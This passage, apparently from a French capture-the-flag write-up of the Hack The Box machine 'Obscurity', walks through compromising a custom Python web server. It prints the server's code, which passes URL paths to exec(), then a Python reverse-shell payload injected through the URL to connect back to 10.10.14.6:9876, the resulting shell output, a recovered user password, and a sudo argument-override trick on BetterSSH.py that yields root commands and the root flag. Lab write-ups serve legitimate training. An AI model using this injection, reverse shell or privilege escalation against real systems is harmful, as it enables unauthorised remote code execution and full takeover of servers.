+        body <span style="color:#f92672">=</span> req[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+        headerDict <span style="color:#f92672">=</span> {}
+        <span style="color:#66d9ef">for</span> param <span style="color:#f92672">in</span> header:
+            pos <span style="color:#f92672">=</span> param<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;: &#34;</span>)
+            key, val <span style="color:#f92672">=</span> param[:pos], param[pos<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>:]
+            headerDict<span style="color:#f92672">.</span>update({key: val})
+        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;method&#34;</span>: method, <span style="color:#e6db74">&#34;doc&#34;</span>: doc, <span style="color:#e6db74">&#34;vers&#34;</span>: vers, <span style="color:#e6db74">&#34;header&#34;</span>: headerDict, <span style="color:#e6db74">&#34;body&#34;</span>: body}
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Server</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, host, port):    
+        self<span style="color:#f92672">.</span>host <span style="color:#f92672">=</span> host
+        self<span style="color:#f92672">.</span>port <span style="color:#f92672">=</span> port
+        self<span style="color:#f92672">.</span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+        self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
+        self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>bind((self<span style="color:#f92672">.</span>host, self<span style="color:#f92672">.</span>port))
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listen</span>(self):
+        self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5</span>)
+        <span style="color:#66d9ef">while</span> True:
+            client, address <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>accept()
+            client<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">60</span>)
+            threading<span style="color:#f92672">.</span>Thread(target <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>listenToClient,args <span style="color:#f92672">=</span> (client,address))<span style="color:#f92672">.</span>start()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listenToClient</span>(self, client, address):
+        size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
+        <span style="color:#66d9ef">while</span> True:
+            <span style="color:#66d9ef">try</span>:
+                data <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(size)
+                <span style="color:#66d9ef">if</span> data:
+                    <span style="color:#75715e"># Set the response to echo back the recieved data </span>
+                    req <span style="color:#f92672">=</span> Request(data<span style="color:#f92672">.</span>decode())
+                    self<span style="color:#f92672">.</span>handleRequest(req, client, address)
+                    client<span style="color:#f92672">.</span>shutdown()
+                    client<span style="color:#f92672">.</span>close()
+                <span style="color:#66d9ef">else</span>:
+                    <span style="color:#66d9ef">raise</span> error(<span style="color:#e6db74">&#39;Client disconnected&#39;</span>)
+            <span style="color:#66d9ef">except</span>:
+                client<span style="color:#f92672">.</span>close()
+                <span style="color:#66d9ef">return</span> False
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handleRequest</span>(self, request, conn, address):
+        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>good:
+<span style="color:#75715e">#            try:</span>
+                <span style="color:#75715e"># print(str(request.method) + &#34; &#34; + str(request.doc), end=&#39; &#39;)</span>
+                <span style="color:#75715e"># print(&#34;from {0}&#34;.format(address[0]))</span>
+<span style="color:#75715e">#            except Exception as e:</span>
+<span style="color:#75715e">#                print(e)</span>
+            document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(request<span style="color:#f92672">.</span>doc, DOC_ROOT)
+            statusNum<span style="color:#f92672">=</span>document[<span style="color:#e6db74">&#34;status&#34;</span>]
+        <span style="color:#66d9ef">else</span>:
+            document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(<span style="color:#e6db74">&#34;/errors/400.html&#34;</span>, DOC_ROOT)
+            statusNum<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;400&#34;</span>
+        body <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;body&#34;</span>]
+        
+        statusCode<span style="color:#f92672">=</span>CODES[statusNum]
+        dateSent <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+        server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BadHTTPServer&#34;</span>
+        modified <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+        length <span style="color:#f92672">=</span> len(body)
+        contentType <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;mime&#34;</span>] <span style="color:#75715e"># Try and identify MIME type from string</span>
+        connectionType <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Closed&#34;</span>
+
+
+        resp <span style="color:#f92672">=</span> Response(
+        statusNum<span style="color:#f92672">=</span>statusNum, statusCode<span style="color:#f92672">=</span>statusCode, 
+        dateSent <span style="color:#f92672">=</span> dateSent, server <span style="color:#f92672">=</span> server, 
+        modified <span style="color:#f92672">=</span> modified, length <span style="color:#f92672">=</span> length, 
+        contentType <span style="color:#f92672">=</span> contentType, connectionType <span style="color:#f92672">=</span> connectionType, 
+        body <span style="color:#f92672">=</span> body
+        )
+
+        data <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>stringResponse()
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+        conn<span style="color:#f92672">.</span>send(data<span style="color:#f92672">.</span>encode())
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">serveDoc</span>(self, path, docRoot):
+        path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
+        <span style="color:#66d9ef">try</span>:
+            info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
+            <span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
+            cwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__))
+            docRoot <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(cwd, docRoot)
+            <span style="color:#66d9ef">if</span> path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>:
+                path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/index.html&#34;</span>
+            requested <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, path[<span style="color:#ae81ff">1</span>:])
+            <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(requested):
+                mime <span style="color:#f92672">=</span> mimetypes<span style="color:#f92672">.</span>guess_type(requested)
+                mime <span style="color:#f92672">=</span> (mime <span style="color:#66d9ef">if</span> mime[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> None <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;text/html&#34;</span>)
+                mime <span style="color:#f92672">=</span> MIMES[requested<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]
+                <span style="color:#66d9ef">try</span>:
+                    <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+                        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+                <span style="color:#66d9ef">except</span>:
+                    <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+                        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+                status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;200&#34;</span>
+            <span style="color:#66d9ef">else</span>:
+                errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;404.html&#34;</span>)
+                mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
+                <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+                    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>format(path)
+                status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404&#34;</span>
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+            <span style="color:#66d9ef">print</span>(e)
+            errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;500.html&#34;</span>)
+            mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
+            <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+                data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+            status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;500&#34;</span>
+        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;body&#34;</span>: data, <span style="color:#e6db74">&#34;mime&#34;</span>: mime, <span style="color:#e6db74">&#34;status&#34;</span>: status}
+
+
+</code></pre></div><h2 id="exploit">Exploit</h2>
+<p>Dans le code on remarque qu&rsquo;il y a un endroit avec la fonction exec. Je reproduis cette partie là du code pour essayer de comprendre exactement ce qu&rsquo;il se passe.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">DOC_ROOT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;DocRoot&#39;</span>
+
+path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>
+docRoot <span style="color:#f92672">=</span> DOC_ROOT
+
+info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
+<span style="color:#66d9ef">print</span>(info<span style="color:#f92672">.</span>format(path))
+<span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
+<span style="color:#66d9ef">print</span>(info)
+cwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__))
+<span style="color:#66d9ef">print</span>(cwd)
+docRoot <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(cwd, docRoot)
+<span style="color:#66d9ef">print</span>(docRoot)
+<span style="color:#66d9ef">if</span> path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>:
+	path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/index.html&#34;</span>
+	requested <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, path[<span style="color:#ae81ff">1</span>:])
+	<span style="color:#66d9ef">print</span>(requested)
+
+</code></pre></div><p>Je commence à mettre des print partout pour voir comment se comporte le code.</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/obscurity]
+└─$ python3 test.py                                                                                                                                                                                                                   
+output = 'Document: /'
+output = 'Document: {}'
+/home/lololekik/Documents/htb/obscurity
+/home/lololekik/Documents/htb/obscurity/DocRoot
+/home/lololekik/Documents/htb/obscurity/DocRoot/index.html
+
+</code></pre><p>En faisant plusieurs manipulation, j&rsquo;arrive à manipuler le code pour créer un fichier.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">DOC_ROOT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;DocRoot&#39;</span>
+
+path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#39;; fichier = open(&#39;pwn.txt&#39;, &#39;a&#39;); fichier.write(&#39;Bonjour monde&#39;); fichier.close() #&#34;</span>
+docRoot <span style="color:#f92672">=</span> DOC_ROOT
+
+info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
+<span style="color:#66d9ef">print</span>(info<span style="color:#f92672">.</span>format(path))
+<span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
+<span style="color:#66d9ef">print</span>(info)
+cwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__))
+<span style="color:#66d9ef">print</span>(cwd)
+docRoot <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(cwd, docRoot)
+<span style="color:#66d9ef">print</span>(docRoot)
+<span style="color:#66d9ef">if</span> path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>:
+	path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/index.html&#34;</span>
+	requested <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, path[<span style="color:#ae81ff">1</span>:])
+	<span style="color:#66d9ef">print</span>(requested)
+
+</code></pre></div><pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/obscurity]
+└─$ ll
+total 24
+-rw-r--r-- 1 root      root      16062 27 janv. 13:23 obscurity.htb
+-rw-r--r-- 1 lololekik lololekik    13 27 janv. 14:40 pwn.txt
+-rwxr-xr-x 1 lololekik lololekik   662 27 janv. 14:40 test.py
+
+</code></pre><p>Je vais maintenant m&rsquo;envoyer un reverse shell via l&rsquo;url suivante : <a href="http://obscurity.htb">http://obscurity.htb</a>:8080/';import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lsquo;10.10.14.6&rsquo;,9876));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);#</p>
+<p>Cependant lors  de l&rsquo;envoi de la requête le &ldquo;#&rdquo; pour le commentaire s&rsquo;effacé, je l&rsquo;ai donc rajouté avec burp.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ nc -nlvp <span style="color:#ae81ff">9876</span>                                                                                                                                                                                                                      <span style="color:#ae81ff">1</span> ⨯
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9876</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.6<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.168<span style="color:#f92672">]</span> <span style="color:#ae81ff">38252</span>
+/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+$ whoami <span style="color:#f92672">&amp;&amp;</span> id <span style="color:#f92672">&amp;&amp;</span> hostname
+www-data
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+obscure
+$ 
+
+</code></pre></div><h1 id="user">User</h1>
+<h2 id="enumération-1">Enumération</h2>
+<p>Dans le répertoire home on trouver un dossier appartenant un robert et on trouve les fichiers suivant à l&rsquo;intérieur.</p>
+
+
+
+  <img src="/img/htb/obscurity/userneum.png" alt="enum user de la machine Obscurity" class="imageformat"/>
+
+<h2 id="exploit-1">Exploit</h2>
+<p>On comprend que le fichier Out.txt correspond au fichier check.txt. Nous allons donc essayer de retrouver la clé utilisée avec ces informations.</p>
+
+
+
+  <img src="/img/htb/obscurity/decrypt.png" alt="decrypt pass user de la machine Obscurity" class="imageformat"/>
+
+<p>On peut maintenant se connecter avec le mot de passe : SecThruObsFTW</p>
+<h1 id="root">Root</h1>
+<h2 id="enumération-2">Enumération</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">robert@obscure:~$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> robert on obscure:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User robert may run the following commands on obscure:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+
+</code></pre></div><p>On voit qu&rsquo;on peut utiliser le script BetterSSH en tant que root.</p>
+<p>De plus on voit dans le code source que le user est spécifié à chaque fois. On peut donc si on peut pas remplacer le user en re-spécifiant l&rsquo;option.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+        command <span style="color:#f92672">=</span> input(session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@Obscure$ &#34;</span>)
+        cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;sudo&#39;</span>, <span style="color:#e6db74">&#39;-u&#39;</span>,  session[<span style="color:#e6db74">&#39;user&#39;</span>]]
+        cmd<span style="color:#f92672">.</span>extend(command<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>))
+        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
+
+        o,e <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>communicate()
+        print(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
+        print(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> print(<span style="color:#e6db74">&#39;&#39;</span>)
+</code></pre></div><h2 id="exploit-2">Exploit</h2>
+<p>Une fois que l&rsquo;on peut executer des commandes en tant que root, on peut s&rsquo;envoyer un reverse shell etc..</p>
+<pre><code class="language-"shell" data-lang=""shell">robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py 
+Enter username: robert
+Enter password: SecThruObsFTW
+Authed!
+robert@Obscure$ -u root id
+Output: uid=0(root) gid=0(root) groups=0(root)
+
+robert@Obscure$ -u root cat /root/root.txt
+Output: 512fd4429facde23609e3
+
+
+robert@Obscure$ 
+</code></pre>
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/hack-the-box/openadmin/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">OpenAdmin - Easy</span>
+    </a>
+    
+    
+    <a href="/hack-the-box/mango/" class="navigation-next">
+      <span class="navigation-tittle">Mango - Medium</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
